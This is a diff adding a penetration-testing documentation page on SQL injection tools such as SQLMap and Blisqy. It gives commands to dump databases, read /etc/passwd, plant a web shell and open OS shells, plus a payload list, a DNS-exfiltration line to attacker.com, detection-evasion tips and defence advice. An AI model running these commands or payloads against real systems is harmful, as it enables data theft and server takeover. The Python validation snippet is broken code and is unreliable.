@@ -1,0 +1,602 @@
+---
+title: 'SQL Injection Tools'
+description: 'Detect and exploit SQL injection vulnerabilities in web applications'
+icon: 'database'
+---
+
+<Warning>
+  **Legal Notice**: Only test SQL injection vulnerabilities on applications you own or have explicit written authorization to test. Unauthorized exploitation is illegal and can result in severe penalties.
+</Warning>
+
+## Overview
+
+SQL Injection (SQLi) remains one of the most critical web application vulnerabilities. These tools help security professionals identify, test, and exploit SQL injection flaws in web applications, databases, and APIs. They automate detection, dumping databases, and demonstrating the impact of SQLi vulnerabilities.
+
+## Use Cases
+
+- **Vulnerability Assessment**: Identify SQL injection points
+- **Penetration Testing**: Exploit SQLi to demonstrate impact
+- **Database Enumeration**: Extract database structure and data
+- **Security Research**: Analyze SQLi attack vectors
+- **Bug Bounty Hunting**: Find and report SQLi vulnerabilities
+
+## Available Tools
+
+<CardGroup cols={3}>
+  <Card title="SQLMap" icon="skull-crossbones" href="https://github.com/sqlmapproject/sqlmap">
+    The most powerful automated SQLi tool
+  </Card>
+  
+  <Card title="NoSQLMap" icon="leaf" href="https://github.com/codingo/NoSQLMap">
+    NoSQL database injection and exploitation
+  </Card>
+  
+  <Card title="DSSS" icon="search" href="https://github.com/stamparm/DSSS">
+    Damn Small SQLi Scanner - lightweight scanner
+  </Card>
+  
+  <Card title="Explo" icon="file-code" href="https://github.com/dtag-dev-sec/explo">
+    Web security issue description framework
+  </Card>
+  
+  <Card title="Blisqy" icon="clock" href="https://github.com/JohnTroony/Blisqy">
+    Time-based blind SQL injection exploiter
+  </Card>
+  
+  <Card title="Leviathan" icon="octopus" href="https://github.com/leviathan-framework/leviathan">
+    Wide-range mass audit toolkit with SQLi
+  </Card>
+  
+  <Card title="SQLScan" icon="bolt" href="https://github.com/Cvar1984/sqlscan">
+    Quick web scanner for SQL injection points
+  </Card>
+</CardGroup>
+
+---
+
+## SQLMap
+
+### Description
+
+SQLMap is the industry-standard open source penetration testing tool that automates detecting and exploiting SQL injection flaws. It supports all major database management systems and provides powerful features for database fingerprinting, data extraction, and even operating system takeover.
+
+### Installation
+
+```bash
+sudo git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+cd sqlmap-dev
+```
+
+### Basic Usage
+
+```bash
+# Simple URL scan
+python3 sqlmap.py -u "http://example.com/page.php?id=1"
+
+# With POST data
+python3 sqlmap.py -u "http://example.com/login.php" --data="username=admin&password=pass"
+
+# Test specific parameter
+python3 sqlmap.py -u "http://example.com/page.php?id=1&name=test" -p id
+
+# Automated scan with wizard
+python3 sqlmap.py --wizard
+```
+
+### Advanced Features
+
+<Accordion title="Database Enumeration">
+  ```bash
+  # List databases
+  python3 sqlmap.py -u "URL" --dbs
+  
+  # List tables in database
+  python3 sqlmap.py -u "URL" -D database_name --tables
+  
+  # List columns in table
+  python3 sqlmap.py -u "URL" -D database_name -T table_name --columns
+  
+  # Dump table data
+  python3 sqlmap.py -u "URL" -D database_name -T users --dump
+  
+  # Dump all databases
+  python3 sqlmap.py -u "URL" --dump-all
+  ```
+</Accordion>
+
+<Accordion title="Authentication Bypass">
+  ```bash
+  # Test login form
+  python3 sqlmap.py -u "http://example.com/login" \
+    --data="username=admin&password=pass" \
+    --level=5 --risk=3
+  
+  # With cookie authentication
+  python3 sqlmap.py -u "URL" \
+    --cookie="PHPSESSID=abcd1234" \
+    --level=2
+  
+  # With custom headers
+  python3 sqlmap.py -u "URL" \
+    --headers="Authorization: Bearer token123"
+  ```
+</Accordion>
+
+<Accordion title="Advanced Exploitation">
+  ```bash
+  # Read file from server
+  python3 sqlmap.py -u "URL" --file-read="/etc/passwd"
+  
+  # Write file to server
+  python3 sqlmap.py -u "URL" --file-write="shell.php" \
+    --file-dest="/var/www/html/shell.php"
+  
+  # Execute OS commands
+  python3 sqlmap.py -u "URL" --os-cmd="whoami"
+  
+  # Get OS shell
+  python3 sqlmap.py -u "URL" --os-shell
+  
+  # Get SQL shell
+  python3 sqlmap.py -u "URL" --sql-shell
+  ```
+</Accordion>
+
+### Important Options
+
+| Option | Description | Example |
+|--------|-------------|----------|
+| `-u` | Target URL | `-u "http://site.com?id=1"` |
+| `--data` | POST data | `--data="user=admin&pass=x"` |
+| `-p` | Testable parameter | `-p id` |
+| `--cookie` | HTTP Cookie value | `--cookie="session=abc123"` |
+| `--level` | Test level (1-5) | `--level=3` |
+| `--risk` | Risk level (1-3) | `--risk=2` |
+| `--dbs` | Enumerate databases | `--dbs` |
+| `-D` | Specify database | `-D mydatabase` |
+| `-T` | Specify table | `-T users` |
+| `--dump` | Dump table data | `--dump` |
+| `--batch` | Never ask for input | `--batch` |
+| `--random-agent` | Use random User-Agent | `--random-agent` |
+| `--tor` | Use Tor network | `--tor` |
+
+### Usage Examples
+
+```bash
+# GET request with automatic fingerprinting
+python3 sqlmap.py -u "http://example.com/product?id=1" --batch --banner
+
+# POST request login form
+python3 sqlmap.py -u "http://example.com/login" \
+  --data="username=admin&password=test" \
+  --level=5 --risk=3 --batch
+
+# Extract specific data
+python3 sqlmap.py -u "http://example.com/user?id=1" \
+  -D website_db -T users -C username,password,email --dump
+
+# Use with Burp Suite request file
+python3 sqlmap.py -r request.txt --batch
+
+# Stealthy scan with randomization
+python3 sqlmap.py -u "http://example.com/page?id=1" \
+  --random-agent --delay=2 --tor --check-tor
+```
+
+<Note>
+  **Performance**: Use `--threads=10` for faster scanning, but be cautious as high thread counts may crash the application or trigger security alerts.
+</Note>
+
+---
+
+## NoSQLMap
+
+### Description
+
+NoSQLMap is designed to audit and automate injection attacks against NoSQL databases like MongoDB, CouchDB, and Redis. As NoSQL databases gain popularity, testing for NoSQL injection becomes increasingly important.
+
+### Installation
+
+```bash
+git clone https://github.com/codingo/NoSQLMap.git
+sudo chmod -R 755 NoSQLMap
+cd NoSQLMap
+python setup.py install
+```
+
+### Running
+
+```bash
+python NoSQLMap
+```
+
+### Features
+
+- MongoDB injection detection
+- CouchDB exploitation
+- Redis command injection
+- Automated data extraction
+- Authentication bypass
+
+<Warning>
+  **MongoDB Requirement**: NoSQLMap requires MongoDB to be installed for full functionality.
+</Warning>
+
+---
+
+## DSSS - Damn Small SQLi Scanner
+
+### Description
+
+DSSS is a lightweight, fully functional SQL injection vulnerability scanner supporting both GET and POST parameters. Perfect for quick scans and integration into automated workflows.
+
+### Installation
+
+```bash
+git clone https://github.com/stamparm/DSSS.git
+cd DSSS
+```
+
+### Usage
+
+```bash
+# Scan GET parameter
+python3 dsss.py -u "http://example.com/page.php?id=1"
+
+# Scan POST parameters
+python3 dsss.py -u "http://example.com/login" --data="user=admin&pass=test"
+
+# Scan with cookie
+python3 dsss.py -u "http://example.com/page?id=1" --cookie="session=abc123"
+
+# Help and options
+python3 dsss.py -h
+```
+
+### Features
+
+- Fast scanning (typically under 100 requests)
+- Minimal false positives
+- GET and POST support
+- Cookie-based testing
+- Lightweight and portable
+
+---
+
+## Explo
+
+### Description
+
+Explo is a tool to describe web security issues in both human and machine-readable format (YAML). It's useful for documenting and sharing SQLi findings in a standardized way.
+
+### Installation
+
+```bash
+git clone https://github.com/dtag-dev-sec/explo.git
+cd explo
+sudo python setup.py install
+```
+
+### Usage
+
+```bash
+# Run test case
+explo testcase.yaml
+
+# Verbose mode
+explo --verbose testcase.yaml
+
+# Run multiple tests
+explo examples/*.yaml
+```
+
+---
+
+## Blisqy
+
+### Description
+
+Blisqy specializes in finding and exploiting time-based blind SQL injection vulnerabilities in HTTP headers. This is particularly useful when traditional injection points are protected but headers are not.
+
+### Installation
+
+```bash
+git clone https://github.com/JohnTroony/Blisqy.git
+cd Blisqy
+```
+
+### Usage
+
+```bash
+# Test User-Agent header
+python blisqy.py -u "http://example.com" -h "User-Agent"
+
+# Test custom header
+python blisqy.py -u "http://example.com" -h "X-Forwarded-For"
+
+# With verbosity
+python blisqy.py -u "http://example.com" -h "Referer" -v
+```
+
+### Time-Based Blind SQLi
+
+<Accordion title="What is Time-Based Blind SQLi?">
+  Time-based blind SQL injection exploits the ability to make the database sleep/delay:
+  
+  **Example payloads:**
+  ```sql
+  # MySQL
+  1' AND SLEEP(5)--
+  
+  # PostgreSQL  
+  1'; SELECT pg_sleep(5)--
+  
+  # Microsoft SQL Server
+  1'; WAITFOR DELAY '00:00:05'--
+  ```
+  
+  **Detection:**
+  - Normal response: < 1 second
+  - Vulnerable response: 5+ seconds
+  
+  Blisqy automates this process for HTTP headers.
+</Accordion>
+
+---
+
+## Leviathan
+
+### Description
+
+Leviathan is a comprehensive mass audit toolkit with service discovery, brute-force capabilities, SQL injection detection, and running custom exploits. Requires API keys for full functionality.
+
+### Installation
+
+```bash
+git clone https://github.com/leviathan-framework/leviathan.git
+cd leviathan
+sudo pip install -r requirements.txt
+```
+
+### Running
+
+```bash
+cd leviathan
+python leviathan.py
+```
+
+### Features
+
+- Mass vulnerability scanning
+- Service discovery
+- SQL injection testing
+- Brute-force capabilities
+- Custom exploit integration
+- API integration (Shodan, Censys)
+
+---
+
+## SQLScan
+
+### Description
+
+SQLScan is a quick web scanner specifically designed to find SQL injection points rapidly. Written in PHP, it's fast and easy to use.
+
+### Installation
+
+```bash
+# Install dependencies
+sudo apt install php php-bz2 php-curl php-mbstring curl
+
+# Download and install
+sudo curl https://raw.githubusercontent.com/Cvar1984/sqlscan/dev/build/main.phar \
+  --output /usr/local/bin/sqlscan
+chmod +x /usr/local/bin/sqlscan
+```
+
+### Running
+
+```bash
+sudo sqlscan
+```
+
+---
+
+## SQL Injection Types
+
+### Classic SQL Injection
+
+```sql
+# Authentication bypass
+' OR '1'='1
+admin'--
+' OR 1=1--
+
+# Union-based
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT username,password FROM users--
+```
+
+### Blind SQL Injection
+
+```sql
+# Boolean-based
+' AND 1=1--  (True condition)
+' AND 1=2--  (False condition)
+
+# Time-based
+' AND SLEEP(5)--
+'; WAITFOR DELAY '00:00:05'--
+```
+
+### Second-Order SQL Injection
+
+Payload is stored in database and executed in a different context later.
+
+### Out-of-Band SQL Injection
+
+```sql
+# DNS exfiltration (MS SQL)
+'; exec master.dbo.xp_dirtree '\\'+@@version+'.attacker.com\share'--
+```
+
+## Best Practices
+
+### Testing Methodology
+
+1. **Identify Injection Points**
+   - URL parameters
+   - POST data
+   - Cookies
+   - HTTP headers
+   - File uploads
+
+2. **Test for Vulnerability**
+   ```bash
+   # Start with simple payloads
+   '
+   ''
+   `
+   "
+   --
+   #
+   ```
+
+3. **Determine Database Type**
+   ```sql
+   # MySQL
+   ' AND @@version--
+   
+   # PostgreSQL
+   ' AND version()--
+   
+   # MS SQL
+   ' AND @@version--
+   
+   # Oracle
+   ' AND banner FROM v$version--
+   ```
+
+4. **Exploit Systematically**
+   - Enumerate databases
+   - Extract table structure
+   - Dump sensitive data
+   - Assess further access
+
+### Avoiding Detection
+
+```bash
+# Use random User-Agent
+sqlmap -u "URL" --random-agent
+
+# Add delays between requests
+sqlmap -u "URL" --delay=2
+
+# Use Tor for anonymity
+sqlmap -u "URL" --tor --check-tor
+
+# Limit threads
+sqlmap -u "URL" --threads=1
+```
+
+### Documentation
+
+<Note>
+  **Report Writing**: Document all findings:
+  - Injection point (parameter, header, etc.)
+  - Payload used
+  - Database type and version
+  - Data extracted
+  - Impact assessment
+  - Remediation recommendations
+</Note>
+
+## Defense Mechanisms
+
+After testing, recommend these protections:
+
+### Prepared Statements (Best Defense)
+
+```python
+# Python with MySQL
+import mysql.connector
+
+cursor = connection.cursor(prepared=True)
+query = "SELECT * FROM users WHERE username = %s"
+cursor.execute(query, (username,))
+```
+
+```php
+// PHP with PDO
+$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username');
+$stmt->execute(['username' => $username]);
+```
+
+### Input Validation
+
+```python
+# Whitelist validation
+import re
+
+if re.match(r'^[a-zA-Z0-9_]+$', user_input):
+    # Safe to use
+else:
+    # Reject input
+```
+
+### Other Protections
+
+- **Least Privilege**: Database user should have minimal permissions
+- **WAF**: Web Application Firewall for additional layer
+- **Escaping**: Last resort, not recommended as primary defense
+- **Error Handling**: Don't expose database errors to users
+- **Monitoring**: Log and alert on suspicious patterns
+
+## Troubleshooting
+
+<Accordion title="SQLMap Not Detecting Vulnerability">
+  **Solutions:**
+  - Increase level: `--level=5`
+  - Increase risk: `--risk=3`
+  - Test all parameters: `-p "*"`
+  - Try different techniques: `--technique=BEUSTQ`
+  - Check for WAF: `--identify-waf`
+  - Bypass WAF: `--tamper=space2comment`
+</Accordion>
+
+<Accordion title="False Positives">
+  **Verification:**
+  - Manually test the payload
+  - Check response differences
+  - Verify with alternative tools
+  - Test with known-safe input
+  - Examine actual database behavior
+</Accordion>
+
+<Accordion title="Slow Performance">
+  **Optimization:**
+  ```bash
+  # Reduce threads
+  --threads=1
+  
+  # Skip heavy checks
+  --no-cast --no-escape
+  
+  # Limit techniques
+  --technique=B  # Boolean-based only
+  
+  # Target specific DBMS
+  --dbms=MySQL
+  ```
+</Accordion>
+
+## Additional Resources
+
+- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
+- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
+- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
+
+<Warning>
+  **Responsible Disclosure**: If you find SQL injection vulnerabilities during authorized testing or bug bounty programs, report them responsibly. Never access, modify, or delete data beyond what's necessary to demonstrate the vulnerability.
+</Warning>
